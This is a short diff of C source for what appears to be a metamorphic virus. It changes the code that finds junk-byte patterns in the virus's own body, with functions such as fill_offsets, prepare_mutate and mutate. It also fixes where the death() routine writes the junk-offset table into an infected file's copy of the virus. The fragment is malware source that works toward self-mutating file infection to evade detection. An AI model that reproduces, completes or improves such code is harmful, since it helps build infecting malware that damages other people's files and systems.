@@ -52,10 +52,6 @@ static int find_pattern(uint8_t *self, size_t offset) {
 
 static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 
-	if (junk_offsets[0] != 0) {
-		return;
-	}
-
 	int j = 0;
 	for (size_t i = 0; i < size - JUNK_LEN; i++) {
 		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
@@ -153,9 +149,10 @@ void prepare_mutate(int opt) {
 
 	JUNK;
 
+	if (g_junk_offsets[0] != 0)
+		return;
+
 	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
-	//if (opt == 1)
-	//	fprint_offsets((uint8_t *)start, VIRUS_SIZE);
 }
 
 void mutate(void) {
@@ -178,7 +175,8 @@ int death(int start_offset, file_t *file) {
 
 	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
 
-	uint8_t *junk = self + junk_pos;
+	uint8_t *junk = self + junk_pos + start_offset;
+
 	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
 
 
